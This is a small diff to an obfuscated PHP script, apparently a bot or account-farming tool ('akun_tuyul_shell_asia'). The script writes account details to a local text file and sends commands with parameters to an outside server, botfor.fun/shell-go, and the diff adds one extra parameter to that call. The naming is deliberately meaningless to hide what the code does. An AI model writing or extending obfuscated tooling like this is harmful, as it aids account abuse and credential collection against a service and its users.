@@ -28,8 +28,8 @@ for($ggggggggggggggggggg=0;$ggggggggggggggggggg<3;$ggggggggggggggggggg++){
 	@file_put_contents("akun_tuyul_shell_asia.txt", "$xxxxxxxxxxxxxxxxxxxxxxxxx | $xxxxxx | $xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | $xxxxxxxxxxx\n", FILE_APPEND);
 }
 
-function asaloleasuasuhehakwoaksodkhahahawkekwkekaksdasdgdkahfasdajfjsehfgh8123jafahfg($cmd, $a = null, $b = null, $c = null, $d = null, $e = null, $f = null){
-	return @file_get_contents("https://botfor.fun/shell-go/xakashafbajhvsdhgfsdlasd.php?cmd=$cmd&a=$a&b=$b&c=$c&d=$d&e=$e&f=$f");
+function asaloleasuasuhehakwoaksodkhahahawkekwkekaksdasdgdkahfasdajfjsehfgh8123jafahfg($cmd, $a = null, $b = null, $c = null, $d = null, $e = null, $f = null, $g = null){
+	return @file_get_contents("https://botfor.fun/shell-go/xakashafbajhvsdhgfsdlasd.php?cmd=$cmd&a=$a&b=$b&c=$c&d=$d&e=$e&f=$f&g=$g");
 }
 
 function xxxxxxxxxxxxxxxxxxxxxxxxxxxx($lllllllllllllllllllll, $kkkkkkkkkkkkkkk = false){
